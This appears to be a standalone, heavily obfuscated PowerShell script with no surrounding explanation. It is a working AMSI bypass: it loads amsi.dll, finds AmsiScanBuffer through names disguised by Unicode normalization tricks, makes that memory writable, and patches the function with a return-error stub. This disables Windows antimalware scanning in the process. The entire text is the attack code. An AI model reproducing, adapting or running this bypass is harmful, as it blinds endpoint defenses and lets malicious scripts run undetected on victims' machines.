$kxiYBtCAgmFbZ = @"
using System;
using System.Runtime.InteropServices;
public class kxiYBtCAgmFbZ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr FQ5Xpun2k2csJhfPw7L, string cGYnF7bVkC4HKiREV);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr F4X_uIkKDQaKZLpgFi, UIntPtr DZgb5NHVCkWh_uS, uint XblkvuN3PHiNU, out uint xEvC7zZJpkKl);
}
"@

Add-Type $kxiYBtCAgmFbZ

$YEgiB = [kxiYBtCAgmFbZ]::LoadLibrary("$(('âmsí'+'.dll').NOrmaliZe([ChAR](70)+[char](32+79)+[ChAr](114+67-67)+[cHaR]([bYTE]0x6d)+[char](68+18-18)) -replace [ChAr](35+57)+[CHAR]([bYte]0x70)+[char](123)+[CHaR](77*30/30)+[cHar]([byTE]0x6e)+[ChAR]([BYtE]0x7d))")
$P2BBCjlNVYRfGr = [kxiYBtCAgmFbZ]::GetProcAddress($YEgiB, "$(('Á'+'m'+'s'+'ì'+'S'+'c'+'ä'+'n'+'B'+'ù'+'f'+'f'+'è'+'r').nORmAlIZE([chAR](70)+[CHar](111)+[CHAr]([ByTE]0x72)+[chAr](109+32-32)+[chaR]([ByTe]0x44)) -replace [chAR](92*88/88)+[chAR](80+32)+[cHar](123*28/28)+[chaR]([bYTe]0x4d)+[chAR]([byte]0x6e)+[chAR](38+87))")
$p = 0
[kxiYBtCAgmFbZ]::VirtualProtect($P2BBCjlNVYRfGr, [uint32]5, 0x40, [ref]$p)
$UHebTVx = "0xB8"
$b6aCsUtks = "0x57"
$UArga_0X = "0x00"
$qzn8Din = "0x07"
$w7V7fIHB = "0x80"
$SfCa8qGhElb = "0xC3"
$vGBv6yBD3_jelhMq = [Byte[]] ($UHebTVx,$b6aCsUtks,$UArga_0X,$qzn8Din,+$w7V7fIHB,+$SfCa8qGhElb)
[System.Runtime.InteropServices.Marshal]::Copy($vGBv6yBD3_jelhMq, 0, $P2BBCjlNVYRfGr, 6)